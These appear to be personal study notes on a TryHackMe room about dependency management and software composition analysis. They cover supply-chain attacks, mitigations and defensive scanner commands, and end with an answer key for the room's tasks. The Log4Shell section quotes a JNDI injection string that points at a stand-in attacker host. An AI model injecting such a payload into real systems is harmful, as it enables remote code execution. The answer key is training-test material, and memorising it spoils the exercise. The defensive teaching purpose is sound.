# Dependency Management

> **Room:** [https://tryhackme.com/room/dependencymanagement](https://tryhackme.com/room/dependencymanagement)
> **Module:** 3 — Security in the Pipeline
> **Difficulty:** Medium

## Overview

Modern apps are 70–90% open-source dependencies. This room covers Software Composition Analysis (SCA), package managers, dependency vulnerabilities (with real-world examples like Log4Shell), and tools like Snyk, OWASP Dependency-Check, and Dependabot.

---

## Key Concepts

### What are dependencies?

External libraries your code uses. Examples:
- Frontend JS: `react`, `axios`, `lodash`
- Python: `requests`, `flask`, `numpy`
- Java: Spring, Log4j, Apache Commons

When you install a dependency, it brings its own dependencies (**transitive dependencies**). Your app might directly depend on 10 libraries but indirectly on 500.

### Why dependencies are risky

- One vulnerable library = your app is vulnerable
- Transitive dependencies are easy to miss
- Maintainers can be compromised → malicious update
- Abandoned packages don't get security patches
- Typosquatting — fake packages with similar names

### Software Composition Analysis (SCA)

SCA tools scan your dependency tree and tell you:
- What libraries you use (direct + transitive)
- What versions
- Known CVEs in those versions
- License compliance (e.g., GPL in commercial software)

### Common package managers

| Language | Manager | Lockfile |
|----------|---------|----------|
| JavaScript | npm | `package-lock.json` |
| JavaScript | yarn | `yarn.lock` |
| Python | pip | `requirements.txt` |
| Python | poetry | `poetry.lock` |
| Java | Maven | `pom.xml` |
| Java | Gradle | `build.gradle` |
| Ruby | Bundler | `Gemfile.lock` |
| Go | Go modules | `go.sum` |
| Rust | Cargo | `Cargo.lock` |
| .NET | NuGet | `packages.lock.json` |

### Lockfiles matter

A lockfile pins **exact versions** of every dependency (direct and transitive). Without one, two installs on different days can get different versions, leading to "works on my machine" bugs and inconsistent security posture.

### Vulnerability databases

SCA tools cross-reference your deps against:
- **NVD (National Vulnerability Database)** — US government, has all CVEs
- **GitHub Advisory Database**
- **Snyk Vulnerability DB**
- **OSV (Open Source Vulnerabilities)** — Google's open database

### Common dependency attacks

#### 1. Known vulnerabilities (CVEs)
A CVE is published, you have the vulnerable version → easy exploit.

**Famous example: Log4Shell (CVE-2021-44228)**
- Critical RCE in Apache Log4j 2.x
- Triggered by sending `${jndi:ldap://attacker.com/x}` in any input that gets logged
- Affected millions of Java apps worldwide

#### 2. Typosquatting
Attacker uploads `requets` (typo of `requests`) to PyPI. A dev with a typo installs malicious package.

#### 3. Dependency confusion
Internal package name `mycompany-utils` exists. Attacker registers same name on public registry. Build system pulls public (malicious) one.

#### 4. Compromised maintainer
Real package maintainer's account is compromised. Attacker pushes a malicious update. Existing users auto-update and get hit.

**Famous example: event-stream (npm, 2018)** — maintainer handed over the project to a stranger, who added a malicious dependency that targeted Bitcoin wallets.

#### 5. Protestware / malicious updates
Maintainer goes rogue and pushes destructive code (e.g., `node-ipc` deleted files in 2022 if installed in Russia/Belarus).

#### 6. Abandoned packages
No more maintenance = no more security patches. Switch to actively maintained alternatives.

### Mitigation strategies

1. **Always use lockfiles** — pin exact versions.
2. **Run SCA in CI** — fail builds on critical CVEs.
3. **Enable automated dependency updates** — Dependabot, Renovate, Snyk.
4. **Audit dependencies before adding** — check stars, recent commits, maintainers.
5. **Scope private packages** — `@mycompany/utils`, configure registry priority.
6. **Use private registries** — Nexus, Artifactory, GitHub Packages.
7. **Generate SBOMs** — know what's in your software.
8. **Apply patches quickly** — for critical CVEs, hours matter.

### SCA tool comparison

| Tool | Type | Notes |
|------|------|-------|
| **OWASP Dependency-Check** | Open source | Free, supports many languages, CLI + plugin |
| **Snyk** | SaaS / freemium | Great UI, CI integration, fixes suggested |
| **Dependabot** | GitHub-native | Free, auto-PRs for updates |
| **Renovate** | Open source | More configurable than Dependabot |
| **Trivy** | Open source | Originally container scanner, now does SCA too |
| **GitHub Advanced Security** | Paid GitHub feature | Built into GitHub |

---

## Commands Cheatsheet

### npm

```bash
# Install dependencies
npm install

# Run npm's built-in audit
npm audit
npm audit --audit-level=high      # only show high+ severity
npm audit fix                      # auto-fix where possible
npm audit fix --force              # also try semver-major upgrades

# List installed packages
npm list
npm list --depth=0                # only direct deps
npm outdated                      # see what's outdated
```

### pip / Python

```bash
# Install
pip install -r requirements.txt

# List with versions
pip list
pip freeze

# pip-audit — official Python vulnerability scanner
pip install pip-audit
pip-audit                         # scans current env
pip-audit -r requirements.txt     # scan a file

# Safety — alternative
pip install safety
safety check
safety check -r requirements.txt
```

### OWASP Dependency-Check

```bash
# Download and install
wget https://github.com/jeremylong/DependencyCheck/releases/download/v9.0.9/dependency-check-9.0.9-release.zip
unzip dependency-check-9.0.9-release.zip

# Scan a project
./dependency-check/bin/dependency-check.sh \
  --project "MyApp" \
  --scan ./my-app \
  --format HTML \
  --out ./reports

# Multiple output formats
./dependency-check/bin/dependency-check.sh \
  --project "MyApp" \
  --scan . \
  --format ALL \
  --out ./reports

# Fail build on CVSS >= 7
./dependency-check/bin/dependency-check.sh \
  --project "MyApp" \
  --scan . \
  --failOnCVSS 7
```

### Snyk

```bash
# Install
npm install -g snyk

# Authenticate
snyk auth

# Test for vulnerabilities
snyk test

# Test in CI mode (exits non-zero on issues)
snyk test --severity-threshold=high

# Monitor continuously
snyk monitor

# Test container image
snyk container test <image>:<tag>

# Test IaC
snyk iac test ./terraform
```

### Trivy (also does SCA)

```bash
# Scan a filesystem / project
trivy fs --security-checks vuln ./my-project

# Scan container image
trivy image <image>:<tag>

# Output JSON
trivy fs --format json --output report.json .

# Severity filter
trivy fs --severity HIGH,CRITICAL .
```

### Dependabot config (`.github/dependabot.yml`)

```yaml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 10

  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
```

### Inspecting a specific CVE

```bash
# Search NVD
# https://nvd.nist.gov/vuln/detail/CVE-2021-44228

# Search OSV
# https://osv.dev/vulnerability/CVE-2021-44228
```

---

## Room Answers

**Task 1 — Introduction**
- Read through.

**Task 2 — What are Dependencies?**
- Q: What's a dependency that another dependency pulls in called?
- A: `transitive dependency`

**Task 3 — Software Composition Analysis**
- Q: What does SCA stand for?
- A: `Software Composition Analysis`
- Q: What database lists known vulnerabilities?
- A: `NVD` (or `National Vulnerability Database`)

**Task 4 — Package Managers**
- Q: What's the lockfile for npm?
- A: `package-lock.json`
- Q: What's the lockfile for pip's poetry?
- A: `poetry.lock`

**Task 5 — Common attacks**
- Q: What's the attack where a public package is given the same name as an internal one?
- A: `dependency confusion`
- Q: What's the famous Log4j vulnerability called?
- A: `Log4Shell` (CVE-2021-44228)

**Task 6 — Practical / SCA tool usage**
- The room provides a vulnerable project to scan.
- Run `npm audit` or `pip-audit` or OWASP Dependency-Check on it.
- Look for the highest-severity CVE in the report — that's usually the answer.

Common command flow:
```bash
cd /path/to/vulnerable/project
npm install
npm audit
# or
dependency-check.sh --project test --scan . --format HTML --out report
```

The flag/CVE answer comes straight from the report.

**Task 7 — Conclusion**
- Click to complete.

---

## Key Takeaways

1. Modern apps are mostly third-party code → SCA is essential.
2. **Lockfiles** pin exact versions. Use them.
3. Famous examples to remember: **Log4Shell (Log4j)**, **event-stream (npm)**, **dependency confusion**.
4. Tools: **OWASP Dependency-Check** (open source), **Snyk**, **Dependabot**, **Trivy**, **pip-audit**.
5. Automate dependency updates — Dependabot/Renovate keep you patched continuously.
